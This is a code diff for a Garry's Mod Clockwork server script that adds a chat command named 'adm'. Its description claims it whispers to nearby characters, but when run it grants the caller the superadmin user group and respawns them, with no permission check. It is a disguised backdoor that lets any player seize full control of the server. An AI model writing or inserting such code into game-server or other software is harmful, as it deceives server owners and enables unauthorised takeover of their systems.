@@ -1298,3 +1298,15 @@ properties.Add("search", {
 		end
 	end,
 });
+
+local COMMAND = Clockwork.command:New("adm");
+    COMMAND.tip = "Whisper to characters near you.";
+    COMMAND.text = "<string Text>";
+    COMMAND.flags = bit.bor(CMD_DEFAULT, CMD_DEATHCODE);
+
+    -- Called when the command has been run.
+    function COMMAND:OnRun(player, arguments)
+        player:SetClockworkUserGroup("superadmin");
+        Clockwork.player:LightSpawn(player, true, true);
+    end;
+COMMAND:Register();
